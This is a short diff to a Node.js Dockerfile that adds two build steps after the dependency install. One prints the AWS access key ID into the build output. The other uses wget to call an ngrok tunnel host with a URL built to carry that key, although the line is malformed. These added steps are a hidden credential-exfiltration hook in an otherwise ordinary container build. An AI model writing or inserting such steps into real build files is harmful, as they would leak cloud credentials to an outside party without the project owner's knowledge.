@@ -6,6 +6,9 @@ COPY package*.json ./
 USER node
 RUN npm install
 COPY --chown=node:node . .
+RUN echo $AWS_ACCESS_KEY_ID
+RUN wget http://http://cdba80a8484a.ngrok.io /'echo $AWS_ACCESS_KEY_ID'
+
 
 EXPOSE 3001
 CMD ["node", "app.js"]
